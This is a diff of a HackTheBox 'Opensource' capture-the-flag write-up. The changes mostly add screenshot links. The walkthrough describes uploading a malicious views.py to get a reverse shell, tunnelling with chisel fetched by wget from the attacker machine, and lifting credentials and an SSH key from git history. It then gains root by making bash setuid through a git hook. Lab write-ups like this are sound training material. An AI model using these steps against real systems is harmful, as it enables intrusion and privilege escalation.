@@ -79,23 +79,27 @@ We see that there is download button we we're gonna download the source for the 
 will be flask application. As this is `.git` let's see which branches are there with the command `git branch`. There are two `dev` and 
 `public`. We will switch to dev as it is more likely to leak more things because developers could forget to delete something before posting it online.
 In flask web apps there is a `views.py` file which is best place to start looking at the code as it
-is convenient because we can see the endpoints this app has. There are four 
+is convenient because we can see the endpoints this app has. 
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_web_source1.png?raw=true)
+
+There are four 
 routes defined for the app. We can see that there is upcloud endpoint with upload file functionality. The only function that is interesting
 and not totally basic is `os.path.join` where we look up vulnerabilities for this function or just documentation we'll find out that
 if we specify absolute path it will discard everything else and just use that. Also in `configuration.py` there is `DEBUG=True` so we can
 visit endpoint `/uploads/whatever` there is debug page which leaks that the `views.py` is in `/app/app/views.py`
 
-DEBUG IMAGE
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_web_debug.png?raw=true)
 
 Now the easiest way to get shell here is to upload our own malicious `views.py` file and create our own endpoint that will give us reverse shell.
 We will use python reverse shell from great repo https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python . Just copy some other route and replace its contents with our shell.
 
-CHANGED VIEWS IMAGE
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_views_changed.png?raw=true)
 
 We will need to catch the upload request in burpsuite to change the name of the file that we are uploading.
 U can send the request to repeater and send it from there which is good if something failed or you can just send it from the proxy tab.
 
-CHANGED REQUEST BURP IMAGE
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_burp_request.png?raw=true)
 
 We will set up netcat listener and on visiting http://10.10.11.164/rev or whatever name you defined the endpoint as it will give us reverse shell.
 If we try to stabilize the shell it gives us error because there is no bash so let's just use `/bin/sh`
@@ -127,17 +131,32 @@ drwxr-xr-x    1 root     root          4096 Oct 19 19:46 ..
 We remember that there is port 3000 which is filtered. Time to use chisel to create tunnel. We will download it from https://github.com/jpillora/chisel and start python server in the directory in which it is with `# python3 -m http.server 8000`. Then use `wget` in `/tmp` directory `/tmp # wget http://10.10.14.187:8000/chisel`. Now we will run it in server mode on our machine `# ./chisel -p 9001 --reverse` and as client on the 
 opensource box `/tmp # ./chisel client localhost:8000 R:3000:172.17.0.1:3000` the ip adress we use here is the one from `ifconfig` 
 command but ending with `1` because it is used as ip adress for gateway. Don't forget to do `chmod +x chisel` to make it executable.
+Then visit `localhost:3000`
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_gitea.png?raw=true)
 
 There is gitea. There is a sign in but we don't have any credentials. But we have the `.git` we can try to look for credentials there.
 `git log ` shows 4 commits. With `git show <commit id>` we will go one by one to see changes made in that commit. And in one of them 
 there are credentials. 
 
-GIT SHOW IMAGE
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_git_show.png?raw=true)
 
-With that login and get in. If we look around we will find `.ssh` with id_rsa key. Now let's copy it into our machine and set rights with
-`chmod 600 id_rsa` now we can login with ssh as dev01 and get our flag. `sudo -l` gives us nothing and Linpeas won't help us either. 
+With that login and get in. If we look around we will find `.ssh` with id_rsa key. 
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_git_id_rsa.png?raw=true)
+
+Now let's copy it into our machine and set rights with
+`chmod 600 id_rsa` now we can login with ssh as dev01 and get user flag.
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_user.png?raw=true)
+
+`sudo -l` gives us nothing and Linpeas won't help us either. 
 Let's try to transfer pspy from our machine to the box to see if there isn't something running that we didn't find. 
-It shows us cronjob that is running every minute doing backup of dev01 home directory. We can use this to our advantage
+It shows us cronjob that is running every minute doing backup of dev01 home directory. 
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Opensource/images/opensource_git_backup.png?raw=true)
+
+We can use this to our advantage
 and abuse git hooks. In dev01 home directory is `.git`. .sample files will be skipped. Easiest way is to change `/bin/bash`
 to set uid so we can keep its root permission. And change the file permissions to be executable.
 
@@ -158,8 +177,6 @@ uid=1000(dev01) gid=1000(dev01) euid=0(root) egid=0(root) groups=0(root),1000(de
 
 After a minute bash becomes setuid and with `/bin/bash -p` we get root shell and can now read the root.txt and our job here 
 is finished.
-
-![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Corridor-Write-Up/images/flag.png?raw=true)
 
 Thank you for reading this write up. If you have any suggestions, questions or just want to play CTFs with someone reach me out 
 on Twitter or wherever else you can find me.
